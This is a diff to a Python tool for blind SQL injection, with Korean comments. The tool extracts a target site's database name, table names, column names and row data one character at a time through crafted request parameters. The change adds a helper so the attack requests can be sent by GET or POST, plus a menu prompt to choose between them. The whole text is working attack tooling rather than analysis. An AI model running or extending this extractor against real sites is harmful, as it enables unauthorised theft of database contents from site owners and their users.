@@ -74,7 +74,7 @@ def get_database_name():
         for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
             payload = payload_templates["database_name"].format(i=i, char=char)
             params = {param_name: payload}
-            response = requests.get(url, params=params)
+            response = send_request(params)
             time.sleep(sleep_time)  # 요청 후 지연
 
             if is_true_response(response):
@@ -98,7 +98,7 @@ def get_table_names(limit=0):
             for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                 payload = payload_templates["table_name"].format(index=index, i=i, char=char)
                 params = {param_name: payload}
-                response = requests.get(url, params=params)
+                response = send_request(params)
                 time.sleep(sleep_time)  # 요청 후 지연
 
                 if is_true_response(response):
@@ -127,7 +127,7 @@ def get_column_names(table_name, limit=0):
             for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                 payload = payload_templates["column_name"].format(table_name=table_name, index=index, i=i, char=char)
                 params = {param_name: payload}
-                response = requests.get(url, params=params)
+                response = send_request(params)
                 time.sleep(sleep_time)  # 요청 후 지연
 
                 if is_true_response(response):
@@ -157,7 +157,7 @@ def get_column_data(table_name, column_name, limit=0):
             for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                 payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, i=i, char=char)
                 params = {param_name: payload}
-                response = requests.get(url, params=params)
+                response = send_request(params)
                 time.sleep(sleep_time)  # 요청 후 지연
 
                 if is_true_response(response):
@@ -186,8 +186,18 @@ def get_all_column_data(table_name, limit=0):
         all_data[column] = column_data
     return all_data
 
+# 요청 전송 함수
+def send_request(params):
+    if request_method == "POST":
+        return requests.post(url, data=params, timeout=10)
+    elif request_method == "GET":
+        return requests.get(url, params=params, timeout=10)
+    else:
+        raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")
+
 # 명령 선택 실행 함수
 def main():
+    global request_method
     while True:
         print("\n[옵션 선택]")
         print("1. 데이터베이스 추출")
@@ -196,6 +206,12 @@ def main():
         print("4. 데이터 추출")
         print("5. 종료")
         choice = input("작업을 선택하세요: ")
+
+        if choice in ["1", "2", "3", "4"]:
+            request_method = input("요청 방식을 선택하세요 (GET/POST): ").strip().upper()
+            if request_method not in ["GET", "POST"]:
+                print("잘못된 요청 방식입니다. GET 또는 POST 중 하나를 입력하세요.")
+                continue
 
         if choice == "1":
             db_name = get_database_name()
